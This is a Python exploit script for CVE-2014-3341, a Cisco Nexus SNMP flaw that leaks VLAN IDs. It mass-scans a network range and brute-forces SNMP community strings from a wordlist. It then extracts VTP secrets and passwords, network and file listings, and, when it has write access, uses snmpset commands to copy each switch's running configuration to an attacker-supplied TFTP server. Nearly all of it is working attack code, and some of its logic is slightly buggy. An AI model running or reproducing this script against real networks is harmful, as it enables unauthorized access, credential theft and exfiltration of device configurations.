#!/usr/bin/env python
#By Ehab hussein
#ehab.hussein@ioactive.co.uk
#Nexus switchs VlanID information leakage. Nexus Switch snmp hax.
#CVE ID: CVE-2014-3341
#Cisco Bug ID: CSCup85616

from sys import argv, exit
import Queue
import threading
import time
from pysnmp.entity.rfc3413.oneliner import cmdgen
import commands

if len(argv) < 3:
	print "python NexusTaco.py CIDR <your-tftp-server-ip> <number of vlans to bruteforce>\n"
	exit()

vlan_nums = int(argv[3])+1
queue = Queue.Queue()
write_cs = ""
found_vlans = False
hosts = commands.getoutput("nmap -n -sL %s |grep report |cut -d \" \" -f5" %argv[1]).split("\n")
print "Thanks nmap for the ip list\nFinding vulnerable switches"

class snmpvlan(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue
    def run(self):
        while True:
                time.sleep(0.50)
                host = self.queue.get()
                self.pwnable(host)
                self.queue.task_done()
    def pwnable(self,host):
        try:
	    #Sneaky way to find nexus switches
            errorIndication, errorStatus, errorIndex, varBinds = cmdgen.CommandGenerator().getCmd(\
                        cmdgen.CommunityData('my-agent', 'B@STARD', 0),\
                        cmdgen.UdpTransportTarget((host, 161)),\
                        (1,3,6))
            if len(varBinds) > 0:
			#nexus switches seem to leak vlanID's with incorrect community strings
		    print host.strip()+":Is a nexus switch, Snmp open, Has Vlans configured\n"
               	    print "Finding VlanIDs on: ",host," With incorrect community string\n"
		    for i in range(1,vlan_nums):
			    errorIndication, errorStatus, errorIndex, varBinds = cmdgen.CommandGenerator().getCmd(\
                        	cmdgen.CommunityData('my-agent', 'meh@%d'%i, 0),\
                        	cmdgen.UdpTransportTarget((host, 161)),\
                        	(1,3,6))
			    if errorStatus == 0:
				print "Host: %s has VlanID %d Configured" %(host, i)
				found_vlans = True
                    if found_vlans == True:
		      print "Bruteforcing for community strings"
                      for cs in open('strings.txt','r').xreadlines():
                    			find_write = commands.getoutput("snmpwalk -v2c -c %s %s 1.3.6.1.2.1.1.1" %(cs.strip(),host))
                                	if "SNMPv2-MIB::sysDescr.0 = STRING:" in find_write:
                                    		print "[%s] Found as community string\n"%cs.strip()
                                    		write_cs = cs.strip()
                                    		break
		      print "Getting system uptime\n"
		      print commands.getoutput("snmpwalk -c %s -v2c %s 1.3.6.1.2.1.1.3"%(write_cs,host)).replace("SNMPv2-MIB::sysUpTime.0 = ","")      
		      print "Grabbing Configured Networks\n"
		      print commands.getoutput("snmpwalk -c %s -v1 %s 1.3.6.1.2.1.4.20.1.3"%(write_cs,host)).replace("IP-MIB::ipAdEntNetMask.","").replace(" = IpAddress: ","/")  
		      print "Grabbing files and folders\n"
		      for i in commands.getoutput("snmpwalk -c %s -v2c %s 1.3.6.1.4.1.9.9.10.1.1.4.2.1.1.5.1.1"%(write_cs,host)).split("\n"):
			print i.split("STRING:")[-1].replace("\"","").strip()		      
		      print "VTP secret= "+ commands.getoutput("snmpwalk -c %s -v2c %s 1.3.6.1.4.1.9.9.46.1.9.1.1.3"%(write_cs,host)).split("=")[-1] 
                      print "VTP auth password= "+ commands.getoutput("snmpwalk -c %s -v2c %s 1.3.6.1.4.1.9.9.46.1.9.1.1.1"%(write_cs,host)).split("=")[-1]
		      if write_cs != "public":
		         print "Preparing for running config copy via tftp\n"
                         raw_input("tftp server should be started. Ensure port forwarding on router to tftp server??\n")
		         print commands.getoutput("snmpset -c %s -v2c %s 1.3.6.1.4.1.9.9.96.1.1.1.1.14.31337 i 5"%(write_cs,host))
                         print commands.getoutput("snmpset -c %s -v2c %s 1.3.6.1.4.1.9.9.96.1.1.1.1.2.31337 i 1"%(write_cs,host))
		         print commands.getoutput("snmpset -c %s -v2c %s 1.3.6.1.4.1.9.9.96.1.1.1.1.3.31337 i 4"%(write_cs,host))
		         print commands.getoutput("snmpset -c %s -v2c %s 1.3.6.1.4.1.9.9.96.1.1.1.1.4.31337 i 1"%(write_cs,host))
		         print commands.getoutput("snmpset -c %s -v2c %s 1.3.6.1.4.1.9.9.96.1.1.1.1.5.31337 a %s" %(write_cs,host,argv[2]))
		         print commands.getoutput("snmpset -c %s -v2c %s 1.3.6.1.4.1.9.9.96.1.1.1.1.6.31337 s %s" %(write_cs,host,host))
		         print commands.getoutput("snmpset -c %s -v2c %s 1.3.6.1.4.1.9.9.96.1.1.1.1.14.31337 i 1"%(write_cs,host))
                         print commands.getoutput("snmpget -c %s -v2c %s 1.3.6.1.4.1.9.9.96.1.1.1.1.10.31337"%(write_cs,host))
		         print commands.getoutput("snmpset -c %s -v2c %s 1.3.6.1.4.1.9.9.96.1.1.1.1.14.31337 i 6"%(write_cs,host))
		      else:
			 print "Read community string found, cannot copy configuration to tftp. Try a better wordlist.\n"
                    else:
			print "No vlans nor snmp open on %s" %host
        except Exception, e:
                print e


if __name__ == '__main__':
        for i in range(25):
                t = snmpvlan(queue)
                t.daemon = True
                t.start()
		t.join(1)
        for host in hosts:
                queue.put(host)
        queue.join()
